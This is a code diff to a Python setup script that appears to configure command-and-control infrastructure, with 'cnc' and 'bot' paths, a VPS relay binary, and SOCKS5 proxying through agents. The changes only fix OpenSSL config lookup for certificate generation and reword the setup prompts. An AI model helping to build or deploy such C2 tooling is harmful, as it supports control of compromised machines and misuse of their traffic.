@@ -652,12 +652,20 @@ def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
         key_path = os.path.join(cnc_path, "./certificates/server.key")
         cert_path = os.path.join(cnc_path, "./certificates/server.crt")
 
+        # Find a valid openssl.cnf — musl-cross toolchains point to nonexistent paths
+        ssl_env = dict(os.environ)
+        for cnf in ["/etc/ssl/openssl.cnf", "/usr/lib/ssl/openssl.cnf"]:
+            if os.path.isfile(cnf):
+                ssl_env["OPENSSL_CONF"] = cnf
+                break
+
         # Generate private key
         info("Generating 4096-bit RSA private key...")
         subprocess.run(
             ["openssl", "genrsa", "-out", key_path, "4096"],
             check=True,
             capture_output=True,
+            env=ssl_env,
         )
 
         # Generate certificate
@@ -682,11 +690,15 @@ def generate_certificates(cnc_path: str, cert_config: dict) -> bool:
             ],
             check=True,
             capture_output=True,
+            env=ssl_env,
         )
 
         return True
     except subprocess.CalledProcessError as e:
+        stderr_msg = e.stderr.decode().strip() if e.stderr else ""
         error(f"Failed to generate certificates: {e}")
+        if stderr_msg:
+            error(f"OpenSSL error: {stderr_msg}")
         return False
     except FileNotFoundError:
         error("OpenSSL not found. Please install: apt install openssl")
@@ -1077,10 +1089,10 @@ def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
         f"{Colors.DIM}   Deploy relay binary on a VPS: ./relay -key <magic_code> -cp 9001 -sp 1080{Colors.RESET}"
     )
     print(
-        f"{Colors.DIM}   Leave blank if you'll specify relay addresses at runtime via !socks.{Colors.RESET}"
+        f"{Colors.DIM}   Leave blank if you'll specify relay addresses at runtime or open SOCKS5 ports directly on agents.{Colors.RESET}"
     )
     print(
-        f"{Colors.YELLOW}   If you don't know what this is, just press Enter to skip it.{Colors.RESET}\n"
+        f"{Colors.YELLOW}   If you don't know what this is, just press Enter to skip it (it's not needed).{Colors.RESET}\n"
     )
     relay_input = prompt(
         "Relay endpoints (comma-separated host:port, or blank to skip)", ""
